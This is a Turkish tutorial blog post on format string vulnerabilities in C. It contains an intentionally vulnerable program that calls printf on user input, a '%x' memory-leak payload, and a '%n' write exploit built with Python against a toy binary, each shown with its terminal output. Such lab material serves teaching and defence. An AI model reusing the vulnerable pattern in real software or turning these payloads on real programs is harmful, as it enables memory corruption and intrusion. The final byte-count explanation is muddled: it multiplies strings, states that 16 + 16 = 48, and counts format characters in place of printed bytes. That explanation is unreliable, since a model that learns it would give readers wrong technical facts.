---
title: Format String Attack
layout: post
---

# **Format String Nedir ?**
*Format string metin ve format parametreleri tutan bir ASCII'dir. Çoğu programlama dilinde de görebiliriz ki herhangi bir metin yazacağımız zaman bu metini  direk yazımızın içine değilde bir değişkene aktarırız, ve bu değişkenide yazımızın içerisinde format stringler aracılığıyla kullanırız.*

Format Stringleri içeren tablo:

![](https://i.imgur.com/4ZCa5cF.png)


# **Format string zafiyetini içeren fonksiyonlar**
![](https://i.imgur.com/gzbKC2S.png)



# **Örnek format string saldırısı**

**Format String zafiyetini sömürmek için kullanacağımız kodumuz: **
```
#include <stdio.h>
#include <string.h>

int hedef;


int main(int argc, char *argv[]){

		char buffer[64];
		
		strcpy(buffer, argv[1]);
		
		printf("Girdiniz: ");
		
		printf(buffer);
		
		if(hedef){
		   printf("Hedef değişkenini düzenlendi.");
		}
		printf("\n");

}
```


**Derlemek(compile) ve Çalıştırmak(run) için:**

```
gcc vuln.c -o vuln

./vuln "Merhaba Dünya"
```

------------------------------------------------------------------------
<br />
**Zafiyeti kullanarak program içerisinde Bellek Sızıntısı(Memory Leak) yaratmak.**

```
./vuln "0x%x 0x%x 0x%x 0x%x"
```

Yukarıda kullanılan "0x%x" ler baştaki "Format Stringleri içeren tablo"sundan da görebileceğiniz gibi hafıza(memory) içerisindeki diğer adresleri format string zafiyetini sömürerek yazıyoruz. Bellek sızıntısı bu şekilde oluşmuş oluyor. Buffer'e kopyaladığımız 1. argümanımız **printf** fonksiyonu tarafından kullanılmaya çalışıldığında buffere verdiğimiz "0x%x"ler çalışacak ve printf fonksiyonunun format string zafiyetinden yararlanarak bellekteki diğer adresleri gözlemleyebildik.

Ve sonucunda çıktımız(output) şu şekilde gelecektir :

```
root@blacknbunny:/home/blacknbunny# ./vuln "0x%x 0x%x 0x%x 0x%x"
Girdiniz: 0xbffff9b6 0x174 0x174 0x78257830
```

------------------------------------------------------------------------
<br />
Şimdi burdan olayımızı veriye yazmaya yani belirtilen hedef degiskenini düzenlemeye kadar nasıl götürebiliriz ? Cevabımızda aşşağıda :

```
root@blacknbunny:/home/blacknbunny# ./vuln `python -c "print('AAAA' + '\xa4\x96\x04\x08'  + 'BBBB' + '.%x'*4 + '%n')"`
Girdiniz: AAAABBBB.bffff9af.bffff7a8.b7eada75.41414141hedef degiskeni duzenlendi
```

Çıktımızda da gördüğümüz gibi hedef değişkenini yukarıda parametre olarak verdiğimiz python command-line girdisi ile düzenledik. Peki bunu nasıl başardık yani sadece küçük bir **printf** fonksiyonundan hafıza(memory) içerisindeki leak'ten corruption'a yani hafızayı bozmaya ya da düzenlemeye kadar gidebildik ?

İlk önce 4 bytelık bir veri verdik. Buda "AAAA" oluyor.

Sonrasında alttaki komutumuz ile **hedef** değişkenimizin adresini **0x80496a4** olarak bulduk ve 2. olarak python command-line girdimize onu verdik. :

```
root@blacknbunny:/home/blacknbunny# objdump -t ./vuln

...
00000000       F *UND*  00000000              printf@@GLIBC_2.0
0804969c g       *ABS*  00000000              __bss_start
080496a8 g       *ABS*  00000000              _end
```
**080496a4** g     O .bss   00000004              hedef
```
0804969c g       *ABS*  00000000              _edata
...
```

Ve 3. olarak 4 bytelık "BBBB"mizi verdik ki hedefin üzerine "BBBB" yi kullanarak "%n" format string'i ile yazabilelim. %n'in ne olduğunu bilmiyorsanız en üstte bulunan "Format Stringleri içeren tablo"suna da bakabilirsiniz.

------------------------------------------------------------------------
<br />
Başta da memoryi leak etmemizi sağlayan "%x" format stringini hatırlıyorsunuzdur. Onuda en sona koyduk ki bu işlemleri yaparken hafızamızı yani memoryi gözlemleyebilelim.

Sonrasında da "%n" format stringimizi "0x80496a4BBBB.%x.%x.%x.%x%n" metininin toplam byte sayısını **hedef** değişkeninin üzerine yazmak için kullandık.

Toplam byte sayısını hesaplamak için : 

```
4 = "AAAA"

4 = "0x80496a4" # int hedef; değişkenimizin adresi

4 = "BBBB"

4 = ".%x."

4 = "%x.%"

4 = "x.%x"

------------------------------------------------------------------------


"AAAA" *  "0x80496a4"

4 * 4 = 16

"BBBB" * ".%x."

4 * 4 = 16

"%x.%" *  "x.%x"

4*4 = 16

16 + 16 = 48
```

Bu da demek oluyor ki **int target;** değişkenimizin üzerine 48 yazmışız ki bunun da hex karşılığı 0x30 oluyor.

Tam olarak **int target;** değişkenimizin üzerinde memory(hafıza) içerisinde **0x30** mevcut.



**References:**

[OWASP](https://www.owasp.org/index.php/Format_string_attack)

[Geeksforgeeks](https://www.geeksforgeeks.org/format-string-vulnerability-and-prevention-with-example/)

[Man page](https://linux.die.net/man/3/printf)

[Wikipedia](https://en.wikipedia.org/wiki/Printf_format_string)
